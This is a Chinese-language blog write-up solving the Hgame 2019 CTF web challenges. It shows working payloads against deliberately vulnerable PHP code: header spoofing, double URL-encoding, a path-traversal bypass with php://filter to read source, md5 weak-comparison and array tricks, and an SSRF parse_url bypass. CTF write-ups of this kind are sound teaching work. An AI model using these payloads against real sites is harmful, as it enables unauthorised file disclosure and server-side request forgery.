<!doctype html><html lang=en-us>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=manifest href=/manifest.json><meta name=description content="[TOC]
Hgame 2019 Web wirteup
"><title>Hgame2019</title>
<link rel=canonical href=https://blog.zeddyu.info/2019/02/27/Hgame2019/>
<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="Hgame2019">
<meta property="og:description" content="[TOC]
Hgame 2019 Web wirteup
">
<meta property="og:url" content="https://blog.zeddyu.info/2019/02/27/Hgame2019/">
<meta property="og:site_name" content="Zeddy's Blog">
<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:tag" content="wp"><meta property="article:published_time" content="2019-02-27T23:09:02+00:00"><meta property="article:modified_time" content="2019-02-27T23:09:02+00:00">
<meta name=twitter:site content="@ZeddYu_Lu">
<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="Hgame2019">
<meta name=twitter:description content="[TOC]
Hgame 2019 Web wirteup
">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDESKL57LT',{anonymize_ip:!1})}</script>
</head>
<body class="article-page has-toc">
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
extended">
<div id=article-toolbar>
<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
<span>Back</span>
</a>
</div>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>
CTF
</a>
</header>
<h2 class=article-title>
<a href=/2019/02/27/Hgame2019/>Hgame2019</a>
</h2>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Feb 27, 2019</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
21 minute read
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<p>[TOC]</p>
<p>Hgame 2019 Web wirteup</p>
<h2 id=week-1>Week 1</h2>
<h3 id=web>Web</h3>
<h4 id=谁吃了我的-flag>谁吃了我的 flag</h4>
<blockquote>
<p>呜呜呜，Mki 一起床发现写好的题目变成这样了，是因为昨天没有好好关机吗 T_T</p>
<p>hint: 据当事人回忆，那个夜晚他正在用 vim 编写题目页面，似乎没有保存就关机睡觉去了,现在就是后悔，十分的后悔。</p>
</blockquote>
<p>既然提示 vim ，那就直接下载<code>.index.html.swp</code>，用<code>vim -r .index.html.swp</code>恢复就好了，得到</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=cp>&lt;!DOCTYPE HTML&gt;</span>
<span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
        <span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
                <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>谁吃了我的flag???<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
        <span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
        <span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
                <span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>damn...hgame2019 is coming soon, but the stupid Mki haven&#39;t finished his web-challenge...<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
Press ENTER or t<span class=p>&lt;/</span><span class=nt>br</span><span class=p>&gt;</span>ommand to continue
                <span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>fine, nothing serious, just give you flag this time...<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
                <span class=p>&lt;/</span><span class=nt>br</span><span class=p>&gt;</span>
                <span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>the flag is hgame{3eek_diScl0Sure_fRom+wEbsit@}
        <span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</code></pre></div><h4 id=换头大作战>换头大作战</h4>
<blockquote>
<p>想要 flag 嘛 工具: burpsuite postman hackbar 怎么用去百度，相信你可以的</p>
</blockquote>
<p>一步步改包就可以了。完整包如下：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/week1/how/index.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>120.78.184.111:8080</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Waterfox/50.0</span>
<span class=n>Referer</span><span class=o>:</span> <span class=l>www.bilibili.com</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>X-Forwarded-For</span><span class=o>:</span> <span class=l>127.0.0.1</span>
<span class=n>Cookie</span><span class=o>:</span> <span class=l>admin=1</span>
<span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
<span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>14</span>

want=%E6%83%B3
</code></pre></div><h4 id=very-easy-web>very easy web</h4>
<blockquote>
<p>代码审计初 ♂ 体验</p>
</blockquote>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
<span class=k>include</span><span class=p>(</span><span class=s2>&#34;flag.php&#34;</span><span class=p>);</span>

<span class=k>if</span><span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=s2>&#34;vidar&#34;</span><span class=p>,</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>])</span><span class=o>!==</span><span class=k>FALSE</span><span class=p>)</span>
  <span class=k>die</span><span class=p>(</span><span class=s2>&#34;&lt;p&gt;干巴爹&lt;/p&gt;&#34;</span><span class=p>);</span>

<span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>urldecode</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]);</span>
<span class=k>if</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s2>&#34;vidar&#34;</span><span class=p>)</span>
<span class=p>{</span>
  <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
<span class=p>}</span>
<span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p>源码如上，比较简单，二次<code>urlencode</code>即可，payload: <code>id=%2576%2569%2564%2561%2572</code></p>
<h4 id=can-u-find-me>can u find me</h4>
<blockquote>
<p>为什么不问问神奇的十二姑娘和她的小伙伴呢</p>
</blockquote>
<p>查看源码得到下一关地址</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html>
<span class=cp>&lt;!DOCTYPE html&gt;</span>
<span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
	<span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>can u find me?<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
	<span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>the gate has been hidden<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
	<span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>can you find it? xixixi<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
	<span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;f12.php&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</code></pre></div><p>跟进，提示</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>please post password to me! I will open the gate for you!<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span> 
</code></pre></div><p>查看该包可以发现有响应头</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>200</span> <span class=ne>OK</span>
<span class=n>Server</span><span class=o>:</span> <span class=l>nginx/1.15.8</span>
<span class=n>Date</span><span class=o>:</span> <span class=l>Sat, 02 Feb 2019 10:32:42 GMT</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=UTF-8</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>X-Powered-By</span><span class=o>:</span> <span class=l>PHP/7.2.14</span>
<span class=n>password</span><span class=o>:</span> <span class=l>woyaoflag</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>302</span>

<span class=cp>&lt;!DOCTYPE html&gt;</span>
<span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
	<span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>can u find me?<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
<span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
	<span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>yeah!you find the gate<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
	<span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>but can you find the password?<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
	<span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>please post password to me! I will open the gate for you!<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span> 
<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span> 

</code></pre></div><p>传入对应的 password 之后，提示</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>right!<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#39;iamflag.php&#39;</span><span class=p>&gt;</span> click me to get flag<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</code></pre></div><p>抓包访问是个 302 跳转，iamflag.php 就存在 flag</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span> <span class=m>302</span> <span class=ne>Found</span>
<span class=n>Server</span><span class=o>:</span> <span class=l>nginx/1.15.8</span>
<span class=n>Date</span><span class=o>:</span> <span class=l>Sat, 02 Feb 2019 10:33:51 GMT</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>text/html; charset=UTF-8</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>X-Powered-By</span><span class=o>:</span> <span class=l>PHP/7.2.14</span>
<span class=n>location</span><span class=o>:</span> <span class=l>toofast.php</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>132</span>

<span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
  	<span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
		<span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>can you find me?<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
	<span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
	<span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
		<span class=p>&lt;</span><span class=nt>p</span><span class=p>&gt;</span>flag:hgame{f12_1s_aMazIng111}<span class=p>&lt;/</span><span class=nt>p</span><span class=p>&gt;</span>
	<span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</code></pre></div><h2 id=week-2>Week 2</h2>
<h3 id=web-1>Web</h3>
<h4 id=easy_php>easy_php</h4>
<blockquote>
<p>代码审计 ♂ 第二弹</p>
</blockquote>
<p>Title 提示 where is my robots ，访问 robots.txt 得到 img/index.php ，访问得到真源码</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
    <span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
    <span class=nv>$img</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;img&#39;</span><span class=p>];</span>
    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$img</span><span class=p>))</span>
        <span class=nv>$img</span> <span class=o>=</span> <span class=s1>&#39;1&#39;</span><span class=p>;</span>
    <span class=nv>$img</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;../&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$img</span><span class=p>);</span>
    <span class=k>include_once</span><span class=p>(</span><span class=nv>$img</span><span class=o>.</span><span class=s2>&#34;.php&#34;</span><span class=p>);</span>
    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</code></pre></div><p>使用<code>....//</code>绕过<code>../</code>的过滤，使用<code>php://filter/read=convert.base64-encode/resource=</code>来读取文件内容</p>
<p>最终 payload:<code>php://filter/read=convert.base64-encode/resource=....//flag</code></p>
<p>解 base64 得到：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
    <span class=c1>//$flag = &#39;hgame{You_4re_So_g0od}&#39;;
</span><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;maybe_you_should_think_think&#34;</span><span class=p>;</span>
</code></pre></div><h4 id=php-trick>php trick</h4>
<blockquote>
<p>some php tricks</p>
</blockquote>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=c1>//admin.php
</span><span class=c1></span><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
<span class=nv>$str1</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=o>@</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;str1&#39;</span><span class=p>];</span>
<span class=nv>$str2</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=o>@</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;str2&#39;</span><span class=p>];</span>
<span class=nv>$str3</span> <span class=o>=</span> <span class=o>@</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;str3&#39;</span><span class=p>];</span>
<span class=nv>$str4</span> <span class=o>=</span> <span class=o>@</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;str4&#39;</span><span class=p>];</span>
<span class=nv>$str5</span> <span class=o>=</span> <span class=o>@</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;H_game&#39;</span><span class=p>];</span>
<span class=nv>$url</span> <span class=o>=</span> <span class=o>@</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>];</span>
<span class=k>if</span><span class=p>(</span> <span class=nv>$str1</span> <span class=o>==</span> <span class=nv>$str2</span> <span class=p>){</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;step 1 fail&#39;</span><span class=p>);</span>
<span class=p>}</span>
<span class=k>if</span><span class=p>(</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$str1</span><span class=p>)</span> <span class=o>!=</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$str2</span><span class=p>)</span> <span class=p>){</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;step 2 fail&#39;</span><span class=p>);</span>
<span class=p>}</span>
<span class=k>if</span><span class=p>(</span> <span class=nv>$str3</span> <span class=o>==</span> <span class=nv>$str4</span> <span class=p>){</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;step 3 fail&#39;</span><span class=p>);</span>
<span class=p>}</span>
<span class=k>if</span> <span class=p>(</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$str3</span><span class=p>)</span> <span class=o>!==</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$str4</span><span class=p>)){</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;step 4 fail&#39;</span><span class=p>);</span>
<span class=p>}</span>
<span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;QUERY_STRING&#39;</span><span class=p>],</span> <span class=s2>&#34;H_game&#34;</span><span class=p>)</span> <span class=o>!==</span><span class=k>false</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;step 5 fail&#39;</span><span class=p>);</span>
<span class=p>}</span>
<span class=k>if</span><span class=p>(</span><span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$str5</span><span class=p>)){</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;step 6 fail&#39;</span><span class=p>);</span>
<span class=p>}</span>
<span class=k>if</span> <span class=p>(</span><span class=nv>$str5</span><span class=o>&lt;</span><span class=mi>9999999999</span><span class=p>){</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;step 7 fail&#39;</span><span class=p>);</span>
<span class=p>}</span>
<span class=k>if</span> <span class=p>((</span><span class=nx>string</span><span class=p>)</span><span class=nv>$str5</span><span class=o>&gt;</span><span class=mi>0</span><span class=p>){</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;step 8 fial&#39;</span><span class=p>);</span>
<span class=p>}</span>
<span class=k>if</span> <span class=p>(</span><span class=nx>parse_url</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span> <span class=nx>PHP_URL_HOST</span><span class=p>)</span> <span class=o>!==</span> <span class=s2>&#34;www.baidu.com&#34;</span><span class=p>){</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;step 9 fail&#39;</span><span class=p>);</span>
<span class=p>}</span>
<span class=k>if</span> <span class=p>(</span><span class=nx>parse_url</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span><span class=nx>PHP_URL_SCHEME</span><span class=p>)</span> <span class=o>!==</span> <span class=s2>&#34;http&#34;</span><span class=p>){</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;step 10 fail&#39;</span><span class=p>);</span>
<span class=p>}</span>
<span class=nv>$ch</span> <span class=o>=</span> <span class=nx>curl_init</span><span class=p>();</span>
<span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span><span class=nx>CURLOPT_URL</span><span class=p>,</span><span class=nv>$url</span><span class=p>);</span>
<span class=nv>$output</span> <span class=o>=</span> <span class=nx>curl_exec</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
<span class=nx>curl_close</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
<span class=k>if</span><span class=p>(</span><span class=nv>$output</span> <span class=o>===</span> <span class=k>FALSE</span><span class=p>){</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;step 11 fail&#39;</span><span class=p>);</span>
<span class=p>}</span>
<span class=k>else</span><span class=p>{</span>
    <span class=k>echo</span> <span class=nv>$output</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div><p>使用<code>str1=QNKCDZO&str2=240610708</code>绕过<code>step 1</code>中的<code>md5</code>弱相等</p>
<p>使用数组绕过<code>step 2</code>中的<code>md5</code>相等</p>
<p>使用<code>.</code>绕过对<code>_</code>的判断，数组绕过对数字的判断</p>
<p>使用<code>http://localhost@127.0.0.1:80@www.baidu.com/admin.php</code>绕过<code>step 9 10</code>的判断，得到<code>admin.php</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=c1>//flag.php
</span><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;only localhost can see it&#39;</span><span class=p>);</span>
<span class=p>}</span>
<span class=nv>$filename</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>]</span><span class=o>??</span><span class=s1>&#39;&#39;</span><span class=p>;</span>

<span class=k>if</span> <span class=p>(</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$filename</span><span class=p>))</span> <span class=p>{</span>
    <span class=k>echo</span> <span class=s2>&#34;sorry,you can&#39;t see it&#34;</span><span class=p>;</span>
<span class=p>}</span>
<span class=k>else</span><span class=p>{</span>
    <span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$filename</span><span class=p>);</span>
<span class=p>}</span>
<span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p>使用<code>filename=xxxxx/../flag.php</code>绕过<code>file_exists</code>与<code>file_get_contents</code>函数</p>
<p>得到<code>flag.php</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span> <span class=nv>$flag</span> <span class=o>=</span> <span class=nx>hgame</span><span class=p>{</span><span class=nx>ThEr4_Ar4_s0m4_Php_Tr1cks</span><span class=p>}</span> <span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><h4 id=php-is-the-best-language>PHP Is The Best Language</h4>
<blockquote>
<p>var_dump 了解一下</p>
</blockquote>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  

<span class=k>include</span> <span class=s1>&#39;secret.php&#39;</span><span class=p>;</span> 

<span class=c1>#echo $flag; 
</span><span class=c1>#echo $secret; 
</span><span class=c1></span>
<span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;gate&#39;</span><span class=p>])</span> <span class=o>||</span> <span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>]))</span> <span class=p>{</span> 
    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span> 
    <span class=k>exit</span><span class=p>;</span> 
<span class=p>}</span> 

<span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;door&#39;</span><span class=p>])){</span> 
    <span class=nv>$secret</span> <span class=o>=</span> <span class=nx>hash_hmac</span><span class=p>(</span><span class=s1>&#39;sha256&#39;</span><span class=p>,</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;door&#39;</span><span class=p>],</span> <span class=nv>$secret</span><span class=p>);</span> 
<span class=p>}</span> 

<span class=nv>$gate</span> <span class=o>=</span> <span class=nx>hash_hmac</span><span class=p>(</span><span class=s1>&#39;sha256&#39;</span><span class=p>,</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>],</span> <span class=nv>$secret</span><span class=p>);</span> 

<span class=k>if</span> <span class=p>(</span><span class=nv>$gate</span> <span class=o>!==</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;gate&#39;</span><span class=p>])</span> <span class=p>{</span> 
    <span class=k>echo</span> <span class=s2>&#34;Hacker GetOut!!&#34;</span><span class=p>;</span> 
    <span class=k>exit</span><span class=p>;</span> 
<span class=p>}</span> 

<span class=k>if</span> <span class=p>((</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>])</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>])))</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span> 
    <span class=k>echo</span> <span class=s2>&#34;Wow!!!&#34;</span><span class=p>;</span> 
    <span class=k>echo</span> <span class=s2>&#34;&lt;/br&gt;&#34;</span><span class=p>;</span> 
    <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span> 
<span class=p>}</span> 
<span class=k>else</span> <span class=p>{</span> 
    <span class=k>echo</span> <span class=s2>&#34;Hacker GetOut!!&#34;</span><span class=p>;</span> 
<span class=p>}</span> 

<span class=cp>?&gt;</span><span class=err> 
</span></code></pre></div><p>一开始我一直在想用数组绕过对<code>key</code>的<code>md5</code>判断，可是一旦用了数组，<code>$gate</code>计算出来的就是<code>NULL</code>，因为<code>hash_hmac('sha256', $_POST['key'], $secret);</code>中<code>key[]</code>为数组，就会出现返回<code>NULL</code>的情况，但是这样的话，<code>$gate</code>就因为<code>key[]</code>的原因等于<code>NULL</code>了，而需要绕过<code>$gate !== $_POST['gate']</code>，就需要<code>gate</code>参数不存在或者为 0，然后这两种情况都绕不过一开始的<code>empty($_POST['gate'])</code>，因为<code>empty(NULL)</code>与<code>empty(0)</code>都是<code>true</code>&mldr;</p>
<p>后来经过一番提醒，<code>$_POST['key']</code>是可以爆破得到的，例如在 100 内</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=mi>99</span> <span class=p>;</span><span class=nv>$i</span><span class=o>++</span><span class=p>){</span>
    <span class=k>if</span> <span class=p>((</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$i</span><span class=p>)</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$i</span><span class=p>)))</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span> 
        <span class=k>echo</span> <span class=nv>$i</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
    <span class=p>}</span>
<span class=p>}</span>

<span class=mi>12</span>
<span class=mi>14</span>
<span class=mi>39</span>
<span class=mi>42</span>
<span class=mi>49</span>
<span class=mi>50</span>
<span class=mi>53</span>
<span class=mi>65</span>
<span class=mi>71</span>
<span class=mi>74</span>
<span class=mi>79</span>
<span class=mi>83</span>
<span class=mi>98</span>
</code></pre></div><p>得到这么多个数&mldr;</p>
